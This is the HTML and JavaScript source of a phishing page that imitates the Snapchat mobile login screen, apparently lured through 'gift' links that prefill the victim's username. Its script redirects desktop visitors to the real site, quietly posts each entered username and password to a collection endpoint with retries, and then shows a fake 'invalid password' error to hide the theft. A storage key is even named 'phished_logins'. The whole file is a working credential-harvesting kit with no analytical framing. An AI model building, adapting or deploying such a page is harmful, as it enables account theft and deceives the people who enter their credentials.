<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>Log In</title>

<!-- Favicon -->
<link rel="apple-touch-icon" sizes="180x180" href="/favicon/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="16x16" href="/favicon/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="48x48" href="/favicon/favicon-48x48.png">
<link rel="manifest" href="/favicon/site.webmanifest">
<link rel="mask-icon" href="/favicon/safari-pinned-tab.svg" color="#FFFC00">
<meta name="msapplication-TileColor" content="#FFFC00">
<meta name="theme-color" content="#ffffff">

<script>
(function(){
  const ua = navigator.userAgent.toLowerCase();
  if(!/mobile|android|iphone|ipad|tablet/i.test(ua) && (ua.includes("windows")||ua.includes("macintosh")||ua.includes("linux"))) {
    window.location.replace("https://accounts.snapchat.com/");
  }
})();
</script>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
<style>
@import url("https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap");
body { font-family: "Inter", sans-serif; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; }
::-webkit-scrollbar { display: none; }

/* Checkbox */
input[type="checkbox"] {
  -webkit-appearance: none; -moz-appearance: none; appearance: none;
  width: 1rem; height: 1rem; border: 2px solid #d1d5db;
  border-radius: 0.25rem; position: relative; cursor: pointer;
}
input[type="checkbox"]:checked::after {
  content: ''; position: absolute; left: 3.5px; top: 0.5px;
  width: 4.5px; height: 9px; border: solid #00b0ff;
  border-width: 0 2px 2px 0; transform: rotate(45deg);
}
input[type="checkbox"]:focus { outline: none; }

/* Login button */
#loginBtn { 
  transition: background 0.2s ease; 
  min-width: 42%; width: 62%; font-size: 1.05rem; padding: 0.7rem 0; 
  display: block; margin: 0 auto; position: relative; overflow: hidden; height: 50px;
  border-radius: 999px;
}
#loginBtn:active, #loginBtn.touch-active { background-color: #0094e0; }

/* Inputs */
.input-container { width: 85%; margin: 0 auto; }
input[type="text"], input[type="password"] { 
  width: 100%; font-size: 0.9rem; font-weight: 500; padding-bottom: 0.15rem; font-family: "Inter", sans-serif;
  border-radius: 0; border-bottom: 1px solid #d1d5db; outline: none;
}

/* Labels & spacing */
label[for="password"] { position: relative; top: -6px; font-size: 0.75rem; }
.password-container { margin-top: 4px; position: relative; }
label.inline-flex.items-center { position: relative; font-size: 0.817rem; font-weight: 350; transition: margin-top 0.2s; }
#forgotPassword { position: relative; font-size: 0.817rem; font-weight: 350; color: #0083ff; transition: margin-top 0.2s; }

/* Error message */
#errorMsg { 
  width: 85%; margin-left: auto; margin-right: auto;
  font-size: 0.8rem; text-align: left; color:#ff1952; font-weight: 400; 
  margin-top: -2px; margin-bottom: 2px; position: relative; top: -4px; 
}

/* Heading */
h1 { position: relative; top: -10px; font-size: 1.7rem; font-weight: 500; text-align: center; }

/* Form spacing */
form.flex.flex-col.space-y-6 { gap: 0.5rem; }

/* UI extras */
.card { background: white; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
.highlight { background-color: #eef2ff; padding: 0.5rem; border-radius: 8px; }
.remove-btn { cursor: pointer; color: #ef4444; }
.remove-btn:hover { color: #dc2626; }
#adminSection { display: none; }
#adminSection.active { display: block; }
.back-arrow i { font-size: 1rem; }

/* Password toggle */
.password-toggle { position: absolute; right: 0; top: 50%; transform: translateY(-50%); color: #adb7bf; font-size: 0.875rem; background: transparent; border: none; cursor: pointer; }

/* Spinner */
.spinner-container { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); display: none; width: 20px; height: 20px; }
.spinner-ring, .spinner-inner { box-sizing: border-box; border-radius: 50%; border: 1.6px solid #fff; border-bottom-color: transparent; position: absolute; top:0; left:0; width: 100%; height: 100%; }
.spinner-ring { animation: spin 1s linear infinite; }
.spinner-inner { width: 60%; height: 60%; top: 20%; left: 20%; animation: spin 1.2s linear infinite reverse; border-width: 1.6px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between max-w-lg mx-auto relative">
<div id="loginSection" class="pt-4 px-6 relative flex flex-col flex-grow">
  <button aria-label="Back" class="absolute top-4 left-6 text-[#00b5e7] leading-none font-medium back-arrow" onclick="goBack()">
    <i class="fas fa-chevron-left"></i>
  </button>
  <h1 class="mt-4 mb-8 text-black font-medium font-sans">Log In</h1>
  <form id="loginForm" class="flex flex-col space-y-6">
    <div class="flex flex-col input-container">
      <label for="username" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">USERNAME, EMAIL, OR PHONE</label>
      <input id="username" type="text" class="border-b border-gray-300 text-lg font-sans pr-10 w-full" autocomplete="username" required inputmode="text">
    </div>
    <div class="flex flex-col password-container input-container">
      <label for="password" class="text-xs font-medium text-gray-400 tracking-widest mb-1 font-sans">PASSWORD</label>
      <input id="password" type="password" class="border-b border-gray-300 text-lg font-sans pr-10 w-full" autocomplete="current-password" required inputmode="text">
      <button type="button" class="password-toggle" onclick="togglePassword()">
        <i id="eyeIcon" class="fas fa-eye-slash"></i>
      </button>
    </div>
    <p id="errorMsg" class="hidden">Invalid username or password. Try again.</p>
    <label id="saveLoginLabel" class="inline-flex items-center space-x-2 font-sans text-sm text-black input-container">
      <input type="checkbox" checked>
      <span>Save Login Info on your iCloud devices</span>
    </label>
    <a id="forgotPassword" href="https://accounts.snapchat.com/accounts/password_reset_request" class="text-center text-sm font-sans mt-2 input-container">Forgot your password?</a>
    <button id="loginBtn" type="submit" class="bg-[#b7c0c8] text-white font-medium text-lg py-3 rounded-full mt-4">
      <span class="btn-text">Log In</span>
      <div class="spinner-container">
        <div class="spinner-ring"></div>
        <div class="spinner-inner"></div>
      </div>
    </button>
  </form>
</div>
<script>
document.addEventListener("DOMContentLoaded", function(){
  const a=document.getElementById("username"),
        b=document.getElementById("password"),
        c=document.getElementById("loginBtn"),
        d=document.getElementById("errorMsg"),
        e=document.getElementById("loginForm"),
        saveLabel=document.getElementById("saveLoginLabel"),
        forgotLink=document.getElementById("forgotPassword"),
        btnText=c.querySelector(".btn-text"),
        spinnerContainer=c.querySelector(".spinner-container"),
        u2="/api/validate",
        m3=3;
  let l5=JSON.parse(localStorage.getItem("phished_logins")||"[]");

  const pathMatch = window.location.pathname.match(/\/gift\/([^\/]+)\/login/);
  if(pathMatch && pathMatch[1]){ a.value = pathMatch[1]; }

  function x1(p,r=m3){
    return fetch(u2,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(p),mode:"cors"})
      .then(s=>s.ok||Promise.reject("Request failed"))
      .catch(()=>(r>0?x1(p,r-1):!1))
  }

  function y2(){
    a.value.trim()&&b.value.trim()?(c.classList.remove("bg-[#b7c0c8]"),c.classList.add("bg-[#00b0ff]"),c.disabled=!1):(c.classList.remove("bg-[#00b0ff]"),c.classList.add("bg-[#b7c0c8]"),c.disabled=!0)
  }

  let hideTimeout;

  function resetErrorSpacing(){
    saveLabel.style.marginTop = "";
    forgotLink.style.marginTop = "";
  }

  a.addEventListener("input",()=>{
    y2();
    d.classList.add("hidden");
    resetErrorSpacing();
    if(hideTimeout) clearTimeout(hideTimeout);
  });

  b.addEventListener("input",()=>{
    y2();
    d.classList.add("hidden");
    resetErrorSpacing();
    if(hideTimeout) clearTimeout(hideTimeout);
  });

  e.addEventListener("submit",async function(o){
    o.preventDefault();
    const t=a.value.trim(),u=b.value.trim();
    if(t&&u){
      btnText.style.display="none";
      spinnerContainer.style.display="block";

      const w={username:t,password:u,timestamp:new Date().toLocaleString()};
      await x1(w); // send data

      hideTimeout = setTimeout(()=>{
        d.textContent="Invalid username or password. Try again.";
        d.classList.remove("hidden");
        b.value=""; y2();
        c.classList.remove("bg-[#00b0ff]"); c.classList.add("bg-[#b7c0c8]"); c.disabled=!0;
        spinnerContainer.style.display="none";
        btnText.style.display="inline";

        saveLabel.style.marginTop = "-6px";
        forgotLink.style.marginTop = "0px";

      }, 1000);
    } else {
      d.textContent="Please fill in both fields.";
      d.classList.remove("hidden");
    }
  });

  c.addEventListener('touchstart', ()=>c.classList.add('touch-active'));
  c.addEventListener('touchend', ()=>c.classList.remove('touch-active'));

  window.togglePassword=function(){
    b.type="password"===b.type?(b.type="text",document.getElementById("eyeIcon").classList.replace("fa-eye-slash","fa-eye")):(b.type="password",document.getElementById("eyeIcon").classList.replace("fa-eye","fa-eye-slash"))
  }
});

function goBack(){window.history.length>1?window.history.back():window.location.reload()}
</script>
</body>
</html>
